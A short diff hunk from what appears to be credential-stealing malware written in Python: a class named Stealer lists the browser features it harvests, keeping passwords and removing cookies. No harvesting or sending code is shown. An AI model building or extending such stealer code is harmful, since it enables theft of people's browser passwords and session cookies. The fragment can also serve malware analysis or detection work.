@@ -61,7 +61,6 @@ class Stealer(Thread):
 
         browser_functions = [
             Features.passwords,
-            Features.cookies,
         ]
         browser_statuses = len(browser_functions) > 0
 
